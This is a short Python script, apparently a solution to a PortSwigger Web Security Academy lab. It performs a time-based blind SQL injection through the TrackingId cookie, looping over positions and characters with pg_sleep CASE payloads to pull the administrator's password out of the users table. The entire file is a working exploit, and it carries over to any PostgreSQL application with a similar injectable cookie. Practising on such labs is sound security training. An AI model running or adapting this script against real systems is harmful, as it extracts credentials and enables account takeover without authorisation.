import requests # type: ignore
import urllib.parse

TARGET = "https://0ae8007303eab09a824bc93b00df00f0.web-security-academy.net/login"
SESSION = "yebLCKoFdI1vbjXKShYvehzi72Idu2fM"
TRACKING_ID = "LwWRRPY3NjnODYj1clear"  # Ton TrackingId original

password = ""

for position in range(1, 21):
    print(f"\n[*] Position {position}/20")
    
    for ascii_code in range(48, 123):  # 0-9 (48-57) + a-z (97-122)
        if 58 <= ascii_code <= 96:  # Skip caractères entre 9 et a
            continue
            
        payload = f"' || (select case when (username='administrator' and ascii(substring(password,{position},1))='{ascii_code}') then pg_sleep(10) else pg_sleep(-1) end from users)--"
        payload_encoded = urllib.parse.quote(payload)
        
        cookies = {
            "TrackingId": TRACKING_ID + payload_encoded,
            "session": SESSION
        }
        
        try:
            r = requests.get(TARGET, cookies=cookies, timeout=15)
            
            if r.elapsed.total_seconds() > 9:
                password += chr(ascii_code)
                print(f"✅ '{chr(ascii_code)}' → {password}")
                break
        except:
            pass

print(f"\n🎯 PASSWORD: {password}")
